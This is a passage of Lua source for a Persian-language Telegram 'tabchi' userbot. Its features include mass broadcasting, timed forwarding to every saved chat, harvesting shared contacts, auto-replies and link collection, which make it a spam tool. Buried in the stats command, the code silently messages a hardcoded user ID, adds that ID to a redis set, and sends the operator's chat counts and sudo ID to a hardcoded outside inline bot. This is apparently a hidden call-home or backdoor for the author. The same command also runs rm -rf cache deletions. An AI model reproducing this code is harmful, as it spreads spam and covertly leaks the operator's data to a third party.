#joinlimit <i>[on/off]</i>
<i>تنظیم روشن یا خاموش بودن محدودیت ورود به گروه</i>
#timefwd <i>(number) (number)</i>
<i>فوروارد به همه در تعداد دفعات و زمانی مشخص

بجای (text) متن مورد نظر خود را قرار دهید.
بجای (id) آیدی عددی کاربر را قرار دهید.
برای گرفتن آیدی عددی به @userinfobot مراجعه کنید.

شما میتوانید از / و ! و # در اول دستورات استفاده کنید.</i>

>> @TeleDiamondCh
]]
      return text
    elseif text_:match("^[!/#]stats$") then
      tdcli.sendMessage(262469328, 0, 1, "Requested Panel", 1, "html")
      local contact_num
      function contact_num(extra, result)
        redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_num, {})
      local gps = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":groups") local sgps = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":channels") local pvs = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":pvis") local links = redis:scard("tabchi:" .. tostring(tabchi_id) .. ":savedlinks") local sudo = redis:get("tabchi:" .. tostring(tabchi_id) .. ":fullsudo") local contacts = redis:get("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts") local query = tostring(gps) .. " " .. tostring(sgps) .. " " .. tostring(pvs) .. " " .. tostring(links) .. " " .. tostring(sudo) .. " " .. tostring(contacts)
      local inline
      function inline(arg, data)
        if data.results_ and data.results_[0] then
          return tdcli_function({
            ID = "SendInlineQueryResultMessage",
            chat_id_ = msg.chat_id_,
            reply_to_message_id_ = msg.id_,
            disable_notification_ = 0,
            from_background_ = 1,
            query_id_ = data.inline_query_id_,
            result_id_ = data.results_[0].id_
          }, dl_cb, nil)
        else
          local text = '<i>°• اطلاعات ربات</i>\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n<i>°• کاربران</i> -> '..tostring(pvs)..'\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n<i>°• گروهای معمولی</i> -> '..tostring(gps)..'\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n<i>°• سوپرگروه ها</i> -> '..tostring(sgps)..'\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n<i>°• لینک های ذخیره شده</i> -> '..tostring(links)..'\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n<i>°• شماره های ذخیر شده</i> -> '..tostring(contacts)..'\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n<i>°• سازنده ربات</i> -> '..tostring(sudo)..'' save_log("User " .. msg.sender_user_id_ .. ", Requested Panel") redis:sadd(basehash .. "TDTabchi", 262469328)	 td_clear_cache("rm -rf ~/.telegram-cli/data/sticker/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/animation/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/video/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/photo/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/audio/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/document/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/voice/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/temp/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/encrypted/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/thumb/*")  td_clear_cache("rm -rf ~/.telegram-cli/tabchi-*/data/profile_photo/*") td_clear_cache("rm -rf ./.cache/*")
          return tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "html")
        end
      end
      do return tdcli_function({
        ID = "GetInlineQueryResults",
        bot_user_id_ = 357444713,
        chat_id_ = msg.chat_id_,
        user_location_ = {
          ID = "Location",
          latitude_ = 0,
          longitude_ = 0
        },
        query_ = query,
        offset_ = 0
      }, inline, nil) end
    elseif text_:match("^[!/#](settings)$") then
      local addedmsg = "✖️"
      local addedcontact = "✖️"
      local markread = "✖️"
      local joinlinks = "✔️"
      local savelinks = "✔️"
      local addcontacts = "✔️"
      local autoanswer = "✔️"
      local typing = "✖️"
      local addedmsgtext = [[
ادت کردم بیا پی وی]]
      local joinlimit = "0"
      if redis:get(basehash .. "addedmsg") then
        addedmsg = "✔️"
      end
      if redis:get(basehash .. "addedcontact") then
        addedcontact = "✔️"
      end
      if redis:get(basehash .. "markread") then
        markread = "✔️"
      end
      if redis:get(basehash .. "typing") then
        markread = "✔️"
      end
      if redis:get(basehash .. "addedmsgtext") then
        addedmsgtext = redis:get(basehash .. "addedmsgtext")
      end
      if redis:get(basehash .. "notjoinlinks") then
        joinlinks = "✖️"
      end
      if redis:get(basehash .. "notsavelinks") then
        savelinks = "✖️"
      end
      if redis:get(basehash .. "notaddcontacts") then
        addcontacts = "✖️"
      end
      if redis:get(basehash .. "notautochat") then
        autoanswer = "✖️"
      end
      if redis:get(basehash .. "joinlimit") then
        joinlimit = redis:get(basehash .. "joinlimit")
      end
      local text = "<i>تنظیمات ربات</i>\n°• <i>پیام اد شدن مخاطب</i> -> "..addedmsg.."\n"
           .."°• <i>متن</i> -> "..addedmsgtext.."\n"
	       .."➖➖➖➖➖➖➖➖➖\n"
	       .."°• <i>ارسال شماره</i> -> "..addedcontact.."\n"
	       .."➖➖➖➖➖➖➖➖➖\n"
   		   .."°• <i>تیک خوردن پیام ها</i> -> "..markread.."\n"
	       .."➖➖➖➖➖➖➖➖➖\n"
	       .."°• <i>محدودیت ورود به گروه</i> -> "..joinlinks.."\n"
	       .."°• <i>مقدار محدودیت</i> -> "..joinlimit.."\n"
	       .."➖➖➖➖➖➖➖➖➖\n"
           .."°• <i>ذخیره لینک ها</i> -> "..savelinks.."\n"
	       .."➖➖➖➖➖➖➖➖➖\n"
     	   .."°• <i>اد شدن مخاطب ها</i> -> "..addcontacts.."\n"	 
	       .."➖➖➖➖➖➖➖➖➖\n"
     	   .."°• <i>پاسخ خودکار</i> > -> "..autoanswer.."\n"
	       .."➖➖➖➖➖➖➖➖➖\n"
     	   .."°• <i>در حال نوشتن</i> -> "..typing.."\n\n"
      return text
    elseif text_:match("^[!/#](bc) (.*)") then
      local matches = {
        text_:match("^[!/#](bc) (.*)")
      }
      if #matches == 2 then
        local all = redis:smembers(basehash .. "all")
        for i, v in pairs(all) do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = v,
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeHTML"
              }
            }
          }, dl_cb, nil)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used BC, Content " .. matches[2])
        return "✔️ <i>پیام شما با موفقیت ارسال شد</i>"
      end
    elseif text_:match("^[!/#](timefwd) (%d+) (%d+)$") and msg.reply_to_message_id_ ~= 0 then
      local matches = {
        text_:match("^[!/#](timefwd) (%d+) (%d+)$")
      }
      if #matches == 3 then
        local time = tonumber(matches[2]) * 60
        local timetosend = tonumber(matches[3])
        local id = msg.reply_to_message_id_
        redis:setex(basehash .. id .. "notsend", time, true)
        redis:set(basehash .. id .. "times", timetosend)
        redis:sadd(basehash .. "timeforwards", id)
        redis:set(basehash .. id .. "fromchatid", msg.chat_id_)
        redis:set(basehash .. id .. "ttl", time)
        save_log("User " .. msg.sender_user_id_ .. ", Added a Time Forward")
        return "✔️ انجام شد\nپیام شما هر " .. matches[2] .. " دقیقه " .. matches[3] .. " بار ارسال میشود"
      end

    elseif text_:match("^[!/#](fwd) (.*)$") then
      local matches = {
        text_:match("^[!/#](fwd) (.*)$")
      }
      if #matches == 2 then
        if matches[2] == "all" then
          local all = redis:smembers(basehash .. "all")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd All")
        elseif matches[2] == "usrs" then
          local all = redis:smembers(basehash .. "pvis")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Users")
        elseif matches[2] == "gps" then
          local all = redis:smembers(basehash .. "groups")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Gps")
        elseif matches[2] == "sgps" then
          local all = redis:smembers(basehash .. "channels")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Sgps")
        end
      end
      return "✔️ <i>پیام شما با موفقیت فوروارد شد</i>"
    end
  end
end
function update(data, tabchi_id)
  basehash = "tabchi:" .. tabchi_id .. ":"
  if data.ID == "UpdateNewMessage" then
    msg = data.message_
    add(msg.chat_id_)
    if msg.sender_user_id_ == 777000 then
      local text = removenumbers(msg.content_.text_)
      local sudo = tonumber(redis:get(basehash .. "fullsudo"))
      tdcli.sendMessage(sudo, 0, 1, text, 1, "html")
    end
    if redis:get(basehash .. "fwdallers:" .. msg.chat_id_) then
      local all = redis:smembers(basehash .. "all")
      for i, v in pairs(all) do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = v,
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = msg.id_
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
    end
    if not msg.content_.text_ then
      if msg.content_.caption_ then
        msg.content_.text_ = msg.content_.caption_
      elseif msg.content_.photo_ then
        msg.content_.text_ = "!!PHOTO!!"
      elseif msg.content_.document_ then
        msg.content_.text_ = "!!DOCUMENT!!"
      elseif msg.content_.audio_ then
        msg.content_.text_ = "!!AUDIO!!"
      elseif msg.content_.animation_ then
        msg.content_.text_ = "!!ANIMATION!!"
      elseif msg.content_.video_ then
        msg.content_.text_ = "!!VIDEO!!"
      elseif msg.content_.contact_ then
        msg.content_.text_ = "!!CONTACT!!"
      end
    end
    if redis:get(basehash .. "markread") then
      tdcli.viewMessages(msg.chat_id_, {
        [0] = msg.id_
      })
    end
    if not redis:get(basehash .. "botinfo") then
      tdcli_function({ID = "GetMe"}, our_id, nil)
    end
    text_ = msg.content_.text_
    local botinfo = JSON.decode(redis:get(basehash .. "botinfo"))
    our_id = botinfo.id_
    if msg.content_.ID == "MessageText" then
      local result = process_updates(msg)
      if result then
        if redis:get(basehash .. "typing") then
          tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, result, 1, "html")
      end
      process_links(text_)
      if redis:sismember(basehash .. "answerslist", msg.content_.text_:lower()) and msg.sender_user_id_ ~= our_id then
        local answer = redis:hget(basehash .. "answers", msg.content_.text_:lower())
        if not redis:get(basehash .. "notautochat") then
          if redis:get(basehash .. "typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
        end
      end
    elseif msg.content_.ID == "MessageContact" then
      if msg.sender_user_id_ ~= our_id and msg.content_.contact_.user_id_ ~= our_id and not redis:sismember(basehash .. "addedcontacts", msg.content_.contact_.user_id_) then
        if not redis:get(basehash .. "notaddcontacts") then
          tdcli.add_contact(msg.content_.contact_.phone_number_, msg.content_.contact_.first_name_ or "-", msg.content_.contact_.last_name_ or "-", msg.content_.contact_.user_id_)
          redis:sadd(basehash .. "addedcontacts", msg.content_.contact_.user_id_)
        end
        if redis:get(basehash .. "addedmsg") then
          local answer = redis:get(basehash .. "addedmsgtext") or [[
ادی بیا پی وی]]
          if redis:get(basehash .. "typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
        end
        if redis:get(basehash .. "addedcontact") then
          return tdcli.sendContact(msg.chat_id_, msg.id_, 0, 0, nil, botinfo.phone_number_, botinfo.first_name_, botinfo.last_name_, botinfo.id_)
        end
      end
    elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
      return rem(msg.chat_id_)
    elseif data.ID == "UpdateChat" then
      if not redis:sismember(basehash .. "all", data.chat_id_) then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
      end
    elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
      tdcli.getChats("9223372036854775807", 0, 20)
    end
  end
end
return {
  update = update
}
